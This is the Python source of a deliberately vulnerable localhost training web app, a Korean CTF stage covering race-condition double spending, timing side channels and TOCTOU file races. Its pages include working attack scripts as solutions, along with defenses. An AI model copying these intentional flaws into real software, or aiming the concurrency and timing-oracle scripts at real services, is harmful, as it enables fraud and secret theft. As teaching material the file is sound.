#!/usr/bin/env python3
"""
7단계 취약 웹앱 (상급, 교육용, localhost 전용).

앞 단계들이 '입력값 하나'로 뚫리는 정적 취약점이라면,
7단계는 '시간'과 '동시성'이 무기입니다. 요청 하나만 봐서는 멀쩡한데,
여러 요청이 겹치는 찰나(race window)에 불변식이 깨집니다.

경고: 고의로 취약. 127.0.0.1 에서 학습용으로만.
의존성 없음 (Python 표준 라이브러리만). 실행: python vuln_app.py  →  http://127.0.0.1:8006

이 서버는 반드시 ThreadingHTTPServer 로 떠서, 동시 요청이 '진짜로' 경합해야
레이스 컨디션이 재현됩니다.

포함 챌린지:
  1. 레이스 컨디션 이중 지불 (TOCTOU check-then-act) — 잔액 1 을 여러 번 쓰기
  2. 타이밍 사이드채널 — 응답 시간으로 비밀을 한 글자씩 복원
  3. TOCTOU 파일 경합 — 검사한 값과 사용하는 값이 달라지는 틈
"""

import html
import os
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST, PORT = "127.0.0.1", 8006

# TOCTOU 파일 경합 챌린지가 사용하는 상태 파일 (files/ 밖, 이 폴더 안).
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TOCTOU_FILE = os.path.join(BASE_DIR, "toctou_request.txt")


# --------------------------------------------------------------------------
# 챌린지 1 상태: 지갑. 잔액 1, "쿠폰" 지급 횟수를 센다.
# 취약: 락(lock) 없이 검사→(대기)→차감→지급 순서라, 여러 스레드가 동시에
#       "잔액 > 0" 검사를 통과해 버린다.
# --------------------------------------------------------------------------
WALLET = {"balance": 1, "grants": 0}


def reset_wallet():
    WALLET["balance"] = 1
    WALLET["grants"] = 0


def vulnerable_buy():
    """check-then-act. sleep 이 검사와 차감 사이의 창(window)을 벌린다."""
    if WALLET["balance"] > 0:          # ① 검사 (TOC: time-of-check)
        time.sleep(0.3)                # ② 창을 벌린다 — 이 사이 다른 스레드가 끼어든다
        WALLET["balance"] -= 1         # ③ 차감 (TOU: time-of-use)
        WALLET["grants"] += 1          # ④ 지급 (쿠폰/아이템)
        return True
    return False


# --------------------------------------------------------------------------
# 챌린지 2 상태: 복원해야 할 비밀. 문자 단위 조기 반환 + 글자당 sleep.
# 취약: 맞는 글자 수에 비례해 응답이 느려져, 시간만 재도 값이 샌다.
# --------------------------------------------------------------------------
TIMING_SECRET = "t1m1ng"          # 오라클로 복원 대상 (소문자+숫자)
TIMING_STEP = 0.05                # 맞은 글자 1개당 추가 지연(초)


def leaky_compare(guess):
    """맞는 접두사 길이만큼 sleep 하고, 틀리는 순간 즉시 반환(early return)."""
    for i, ch in enumerate(TIMING_SECRET):
        if i >= len(guess) or guess[i] != ch:
            return False              # 틀리는 즉시 반환 → 여기까지의 sleep 만 누적됨
        time.sleep(TIMING_STEP)       # 이 글자가 맞았다 → 시간을 쓴다
    return len(guess) == len(TIMING_SECRET)


# --------------------------------------------------------------------------
# 챌린지 3: TOCTOU 파일 경합.
# 파일에 적힌 '지급 금액'을 검사(안전한 소액인지)한 뒤, 잠시 후 다시 읽어
# 그 금액을 지급한다. 검사와 사용 사이에 파일을 바꾸면 검사를 통과한 채로
# 큰 금액이 지급된다.
# --------------------------------------------------------------------------
APPROVE_LIMIT = 100               # 이 값 이하면 '자동 승인해도 안전'하다고 가정


def read_amount():
    try:
        with open(TOCTOU_FILE, "r", encoding="utf-8") as f:
            txt = f.read().strip()
        # "amount=NNN" 형식
        return int(txt.split("=", 1)[1])
    except Exception:
        return 0


def write_amount(n):
    with open(TOCTOU_FILE, "w", encoding="utf-8") as f:
        f.write(f"amount={int(n)}")


def ensure_toctou_file():
    if not os.path.exists(TOCTOU_FILE):
        write_amount(APPROVE_LIMIT)


def vulnerable_approve():
    """파일의 금액을 검사 → 대기 → 다시 읽어서 지급. 반환: (지급액, FLAG여부)."""
    checked = read_amount()               # ① 검사 시점 값
    if checked <= APPROVE_LIMIT:          # ② '소액이라 안전' 판정
        time.sleep(0.4)                   # ③ 창 — 이 사이 파일이 바뀔 수 있다
        paid = read_amount()              # ④ 사용 시점 값 (다시 읽음!)
        # 취약: paid 가 한도를 넘어도, 검사는 이미 통과했으므로 그대로 지급한다
        got_flag = paid > APPROVE_LIMIT
        return paid, got_flag
    return 0, False


# --------------------------------------------------------------------------
# HTML 레이아웃
# --------------------------------------------------------------------------
CSS = """
<style>
  body{font-family:system-ui,Segoe UI,Arial,sans-serif;max-width:900px;margin:0 auto;
       padding:1rem;background:#150f0a;color:#e9e4dd;line-height:1.5}
  a{color:#ffb86c} h1,h2{color:#fff}
  nav{display:flex;gap:.6rem;flex-wrap:wrap;padding:.75rem 0;border-bottom:1px solid #3a2f22;margin-bottom:1rem}
  nav a{padding:.3rem .6rem;background:#241a10;border-radius:6px;text-decoration:none}
  .card{background:#1d160e;border:1px solid #3a2c1a;border-radius:10px;padding:1rem;margin:1rem 0}
  .hint{background:#2a1c0b;border-left:3px solid #e0913a;padding:.6rem .9rem;margin:.6rem 0;border-radius:4px}
  .flag{color:#7ee787;font-weight:bold}
  input,textarea{background:#150f0a;color:#e9e4dd;border:1px solid #4a3a26;border-radius:6px;
                 padding:.45rem;font-size:1rem;width:100%;max-width:440px;box-sizing:border-box}
  button{background:#d9772b;color:#fff;border:0;border-radius:6px;padding:.5rem 1rem;
         font-size:1rem;cursor:pointer;margin-top:.5rem}
  code,pre{background:#0d0906;padding:.15rem .35rem;border-radius:4px;color:#ffc27a}
  pre{padding:.8rem;overflow:auto;display:block}
  .warn{background:#3a1414;border:1px solid #7a2222;padding:.6rem;border-radius:8px;color:#ffb4b4}
  details summary{cursor:pointer;color:#e0913a}
  label{display:block;margin:.5rem 0 .2rem}
  .lvl{font-size:.8rem;background:#3a1a2a;color:#ffa6d0;padding:.1rem .5rem;border-radius:10px}
  .stat{font-size:1.1rem}
  .stat b{color:#ffc27a}
</style>
"""

NAV = """
<nav>
  <a href="/">🏠 홈</a>
  <a href="/race">1. 레이스 컨디션</a>
  <a href="/timing">2. 타이밍 사이드채널</a>
  <a href="/toctou">3. TOCTOU 파일 경합</a>
</nav>
"""


def page(title, body):
    return f"""<!doctype html><html lang="ko"><head><meta charset="utf-8">
<title>{title}</title>{CSS}</head><body>{NAV}{body}</body></html>""".encode("utf-8")


# --------------------------------------------------------------------------
def view_home():
    body = """
    <h1>⏱️ 7단계 취약 웹앱 <span class="lvl">상급 · 타이밍/경합</span></h1>
    <div class="warn">고의로 취약. 127.0.0.1 학습 전용. 외부 노출 금지.</div>
    <p>여기서는 <b>요청 하나만 보면 완벽히 정상</b>인 코드가 무너집니다.
    무기는 <b>시간</b>과 <b>동시성</b>입니다. 검사와 실행 '사이의 틈'을 노리세요.</p>
    <div class="card">
      <h2>이 단계에서 배우는 것</h2>
      <ul>
        <li><b>레이스 컨디션 (이중 지불)</b> — 잔액 1 을 여러 요청이 동시에 통과시켜 초과 사용</li>
        <li><b>타이밍 사이드채널</b> — 비교가 '틀리는 순간 멈추면' 응답 시간이 정답 길이를 흘린다</li>
        <li><b>TOCTOU 파일 경합</b> — 검사한 값과 실제로 쓰는 값이 그 사이에 뒤바뀐다</li>
      </ul>
    </div>
    <div class="card"><b>목표 FLAG 3개:</b>
      <code>FLAG{race_condition_double_spend}</code>,
      <code>FLAG{timing_side_channel}</code>,
      <code>FLAG{toctou_gap}</code>.</div>
    <div class="card"><b>준비물:</b> 브라우저 버튼 클릭만으로는 경합이 재현되지 않습니다.
      각 페이지의 <b>공격 스크립트</b>(표준 라이브러리만)를 실제로 돌려 동시 요청을 보내세요.</div>
    """
    return page("7단계 취약 웹앱", body)


# 1) 레이스 컨디션 이중 지불 --------------------------------------------------
def view_race(method, body_params):
    msg = ""
    if method == "POST":
        action = body_params.get("action", [""])[0]
        if action == "reset":
            reset_wallet()
            msg = '<div class="card">🔄 지갑을 초기화했습니다 (잔액 1, 지급 0).</div>'
        elif action == "buy":
            ok = vulnerable_buy()
            if ok:
                msg = '<div class="card">🛒 구매 처리됨 (쿠폰 1개 지급).</div>'
            else:
                msg = '<div class="warn">잔액 부족으로 거절.</div>'

    flag = ""
    if WALLET["grants"] > 1:
        flag = (f'<p class="flag">🎉 FLAG{{race_condition_double_spend}} — '
                f'잔액 1 로 쿠폰을 {WALLET["grants"]}번 받았습니다! '
                f'(현재 잔액 {WALLET["balance"]})</p>')

    body = f"""
    <h1>1. 레이스 컨디션 — 이중 지불 (double spend)</h1>
    <div class="card stat">
      현재 잔액: <b>{WALLET["balance"]}</b> · 지급된 쿠폰 수: <b>{WALLET["grants"]}</b>
      {flag}
    </div>
    <div class="card">
      <form method="post">
        <input type="hidden" name="action" value="buy">
        <button>쿠폰 1개 구매 (잔액에서 1 차감)</button>
      </form>
      <form method="post">
        <input type="hidden" name="action" value="reset">
        <button style="background:#555">지갑 초기화</button>
      </form>
      {msg}
    </div>
    <p><b>🎯 목표:</b> 잔액이 <b>1</b>뿐인데 쿠폰을 <b>2개 이상</b> 받아내세요.
    성공하면 잔액이 음수가 되고 FLAG 가 나타납니다.</p>
    <div class="card">서버 로직(취약):
      <pre>if balance > 0:      # ① 검사
    sleep(0.3)       # ② 창을 벌림 — 여기서 다른 요청이 끼어든다
    balance -= 1     # ③ 차감
    grant()          # ④ 지급</pre>
      버튼을 한 번씩 누르면 절대 재현되지 않습니다. <b>동시에</b> 여러 요청을 보내야
      모두 ①을 통과한 뒤 ③④가 겹칩니다.</div>
    <div class="hint">💡 힌트 1: 먼저 '지갑 초기화'로 잔액을 1 로 되돌리세요.</div>
    <div class="hint">💡 힌트 2: 스레드/프로세스로 <code>/race</code> 에
      <code>action=buy</code> POST 를 <b>동시에 여러 개</b> 던지세요. sleep(0.3) 창 안에
      도착한 요청은 전부 "잔액 &gt; 0" 검사를 통과합니다.</div>
    <details><summary>정답(파이썬 공격 스크립트) 보기</summary>
      <p>먼저 초기화한 뒤, 동시 요청 10개를 쏘면 대부분 잔액 1 로 여러 개가 지급됩니다.</p>
      <pre>import urllib.request, threading

BASE = "http://127.0.0.1:8006/race"

def post(action):
    data = ("action=" + action).encode()
    urllib.request.urlopen(BASE, data=data, timeout=10).read()

# 1) 잔액 초기화
post("reset")

# 2) 동시에 구매 요청 10개 (sleep(0.3) 창 안에 몰아넣기)
ts = [threading.Thread(target=post, args=("buy",)) for _ in range(10)]
for t in ts: t.start()
for t in ts: t.join()

# 3) /race 를 열어보면 grants > 1, balance 음수 → FLAG
print(urllib.request.urlopen(BASE).read().decode())</pre>
      <p>동시 스레드가 전부 <code>balance &gt; 0</code> 검사를 통과한 뒤 차례로 차감하므로,
      잔액이 <code>1 → 0 → -1 → -2 ...</code> 로 내려가고 쿠폰은 여러 번 지급됩니다 →
      <span class="flag">FLAG{{race_condition_double_spend}}</span>.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 검사와 차감을 <b>하나의 원자적 연산</b>으로 묶으세요.
      락(<code>threading.Lock</code>)으로 임계구역을 감싸거나, DB 라면
      <code>UPDATE wallet SET balance=balance-1 WHERE balance&gt;0</code> 처럼 조건부 갱신 후
      <b>영향받은 행 수</b>를 확인하세요(0 이면 실패). 낙관적 락(버전 컬럼)도 방법입니다.</div>
    """
    return page("레이스 컨디션", body)


# 2) 타이밍 사이드채널 --------------------------------------------------------
def view_timing(params):
    result = ""
    guess = params.get("secret", [""])[0]
    if guess:
        t0 = time.perf_counter()
        ok = leaky_compare(guess)
        elapsed = time.perf_counter() - t0
        if ok:
            result = (f'<div class="card"><span class="flag">🎉 정답! '
                      f'FLAG{{timing_side_channel}}</span><br>응답 시간: {elapsed*1000:.0f} ms</div>')
        else:
            result = (f'<div class="card">❌ 틀렸습니다. '
                      f'(응답 시간: {elapsed*1000:.0f} ms — 이 숫자를 눈여겨보세요)</div>')

    body = f"""
    <h1>2. 타이밍 사이드채널</h1>
    <div class="card">
      <form method="get">
        <label>비밀 값 추측 (소문자+숫자)</label>
        <input name="secret" value="{html.escape(guess)}" placeholder="추측값">
        <button>확인</button>
      </form>
      {result}
    </div>
    <p><b>🎯 목표:</b> 화면은 맞았는지/틀렸는지만 알려줍니다. 그런데 서버는
    <b>맞은 글자 하나당 {int(TIMING_STEP*1000)}ms 씩</b> 느려집니다. 응답 시간만 재서
    비밀 값을 <b>한 글자씩</b> 복원하세요.</p>
    <div class="card">서버 로직(취약):
      <pre>for i, ch in enumerate(SECRET):
    if i >= len(guess) or guess[i] != ch:
        return False        # 틀리는 즉시 반환 (early return)
    sleep(0.05)             # 맞은 글자마다 시간을 쓴다
return len(guess) == len(SECRET)</pre>
      접두사가 많이 맞을수록 <code>sleep</code> 이 더 여러 번 실행되어 응답이 느려집니다.</div>
    <div class="hint">💡 힌트 1: 첫 글자 후보(<code>a</code>~<code>z</code>, <code>0</code>~<code>9</code>)를
      하나씩 넣고 응답 시간을 재세요. 가장 <b>느린</b> 후보가 맞은 글자입니다.</div>
    <div class="hint">💡 힌트 2: 맞은 글자를 고정하고 그 뒤에 다음 후보를 붙여 반복하세요.
      한 글자 더 맞으면 응답이 {int(TIMING_STEP*1000)}ms 더 늘어납니다.</div>
    <div class="hint">💡 힌트 3: 네트워크 지터를 줄이려면 후보마다 여러 번 재서
      <b>중앙값/평균</b>을 쓰세요.</div>
    <details><summary>정답(파이썬 타이밍 오라클) 보기</summary>
      <pre>import urllib.request, time, string

BASE = "http://127.0.0.1:8006/timing?secret="
CHARSET = string.ascii_lowercase + string.digits

def timed(guess, repeat=5):
    best = []
    for _ in range(repeat):
        t0 = time.perf_counter()
        urllib.request.urlopen(BASE + urllib.parse.quote(guess), timeout=10).read()
        best.append(time.perf_counter() - t0)
    best.sort()
    return best[len(best)//2]          # 중앙값

import urllib.parse
recovered = ""
while True:
    timings = {{c: timed(recovered + c) for c in CHARSET}}
    best_char = max(timings, key=timings.get)
    # 후보를 더 붙여도 시간이 안 늘면 끝난 것
    if timings[best_char] < timed(recovered) + 0.02:
        break
    recovered += best_char
    print("복원 중:", recovered)

print("복원된 비밀:", recovered)
print(urllib.request.urlopen(BASE + recovered).read().decode()[:200])</pre>
      <p>각 위치에서 '가장 느린 후보'를 골라 이어붙이면 비밀 <code>{TIMING_SECRET}</code> 이
      복원되고, 그 값을 넣으면 <span class="flag">FLAG{{timing_side_channel}}</span>.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 비밀 비교는 <b>상수 시간</b>으로 하세요
      (<code>hmac.compare_digest</code>). 조기 반환·글자별 지연처럼 입력에 따라
      실행 시간이 달라지는 경로를 없애야 합니다.</div>
    """
    return page("타이밍 사이드채널", body)


# 3) TOCTOU 파일 경합 --------------------------------------------------------
def view_toctou(method, params, body_params):
    ensure_toctou_file()
    msg = ""
    if method == "POST":
        action = body_params.get("action", [""])[0]
        if action == "approve":
            paid, got_flag = vulnerable_approve()
            if got_flag:
                msg = (f'<div class="card"><span class="flag">🎉 FLAG{{toctou_gap}}</span><br>'
                       f'검사는 "소액({APPROVE_LIMIT} 이하)"으로 통과했는데 실제로는 '
                       f'<b>{paid}</b> 이 지급되었습니다!</div>')
            elif paid:
                msg = f'<div class="card">✅ {paid} 지급 완료 (한도 내, 정상).</div>'
            else:
                msg = '<div class="warn">한도 초과로 승인 거절 (검사 시점에 이미 큰 금액).</div>'
        elif action == "reset":
            write_amount(APPROVE_LIMIT)
            msg = f'<div class="card">🔄 요청 파일을 amount={APPROVE_LIMIT} 로 초기화했습니다.</div>'
    elif method == "GET" and "amount" in params:
        # 공격자가 검사~사용 창 사이에 파일을 바꾸는 통로
        try:
            write_amount(int(params.get("amount", ["0"])[0]))
            msg = f'<div class="card">✏️ 요청 파일을 amount={read_amount()} 로 바꿨습니다.</div>'
        except Exception:
            msg = '<div class="warn">숫자를 넣으세요.</div>'

    current = read_amount()
    body = f"""
    <h1>3. TOCTOU 파일 경합 — 검사한 값 ≠ 쓰는 값</h1>
    <div class="card stat">현재 요청 파일 금액: <b>{current}</b>
      (자동 승인 한도: {APPROVE_LIMIT})</div>
    <div class="card">
      <form method="post">
        <input type="hidden" name="action" value="approve">
        <button>지급 승인 처리 (검사 → 대기 → 지급)</button>
      </form>
      <form method="get">
        <label>요청 파일 금액 바꾸기</label>
        <input name="amount" value="{current}">
        <button style="background:#555">파일 수정</button>
      </form>
      <form method="post">
        <input type="hidden" name="action" value="reset">
        <button style="background:#555">파일 초기화(=100)</button>
      </form>
      {msg}
    </div>
    <p><b>🎯 목표:</b> 승인 검사는 "소액이라 안전"으로 통과시키면서, 실제 지급액은
    한도({APPROVE_LIMIT})를 <b>초과</b>하게 만드세요.</p>
    <div class="card">서버 로직(취약):
      <pre>checked = read_amount()          # ① 파일에서 금액 읽어 검사
if checked &lt;= {APPROVE_LIMIT}:              # ② 소액이면 안전 판정
    sleep(0.4)                   # ③ 창 — 이 사이 파일이 바뀔 수 있다
    paid = read_amount()         # ④ 다시 읽어서 지급 (검사한 값이 아님!)
    payout(paid)</pre>
      검사(①)와 사용(④)이 <b>같은 파일을 두 번 읽습니다</b>. 그 사이(③)에 파일을 바꾸면
      검사는 통과한 채로 큰 금액이 지급됩니다.</div>
    <div class="hint">💡 힌트 1: 파일을 <code>amount=100</code>(한도 이하)로 두고 '승인'을 시작하세요.
      ②에서 안전 판정을 받습니다.</div>
    <div class="hint">💡 힌트 2: 승인이 <code>sleep(0.4)</code> 로 멈춰 있는 그 순간
      <code>/toctou?amount=999999</code> 로 파일을 바꾸세요. ④가 그 값을 읽어 지급합니다.</div>
    <details><summary>정답(파이썬 공격 스크립트) 보기</summary>
      <pre>import urllib.request, threading, time

BASE = "http://127.0.0.1:8006/toctou"

def approve():
    urllib.request.urlopen(BASE, data=b"action=approve", timeout=10).read()

def set_amount(n):
    urllib.request.urlopen(BASE + "?amount=" + str(n), timeout=10).read()

# 1) 파일을 한도 이하로 (검사 통과용)
set_amount(100)

# 2) 승인 시작 → 검사는 100 으로 통과, sleep(0.4) 진입
t = threading.Thread(target=approve); t.start()

# 3) 창(0.4s) 안에 파일을 큰 값으로 바꿔치기
time.sleep(0.15)
set_amount(999999)

t.join()
# 승인 응답에 FLAG{{toctou_gap}} 이 담긴다
print(urllib.request.urlopen(BASE, data=b"action=approve", timeout=10)) # 확인용
</pre>
      <p>검사 시점엔 100(안전)이었지만 지급 시점엔 999999 → 한도 초과 지급 →
      <span class="flag">FLAG{{toctou_gap}}</span>.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 검사한 대상과 사용하는 대상이 <b>같음을 보장</b>하세요.
      값을 한 번만 읽어 변수에 담고 그 변수로 검사·사용을 모두 하거나(재읽기 금지),
      파일 핸들·락·원자적 rename 으로 중간 변경을 막으세요. 파일 경로 검사 후
      다시 여는 패턴(심볼릭 링크 경합)도 같은 함정입니다.</div>
    """
    return page("TOCTOU 파일 경합", body)


# --------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    def _send(self, content, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def _route(self, method):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        params = urllib.parse.parse_qs(parsed.query)
        body_params = {}
        if method == "POST":
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
            body_params = urllib.parse.parse_qs(raw)

        if path == "/":
            self._send(view_home())
        elif path == "/race":
            self._send(view_race(method, body_params))
        elif path == "/timing":
            self._send(view_timing(params))
        elif path == "/toctou":
            self._send(view_toctou(method, params, body_params))
        else:
            self._send(page("404", "<h1>404 Not Found</h1>"), status=404)

    def do_GET(self):
        self._route("GET")

    def do_POST(self):
        self._route("POST")

    def log_message(self, fmt, *args):
        print("[req]", self.address_string(), fmt % args)


def main():
    ensure_toctou_file()
    reset_wallet()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"7단계 취약 웹앱 실행 중 → http://{HOST}:{PORT}  (Ctrl+C 로 종료)")
    print("경고: localhost 전용. 외부에 노출하지 마세요. (동시성 재현을 위해 ThreadingHTTPServer)")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n종료합니다.")
        server.shutdown()


if __name__ == "__main__":
    main()
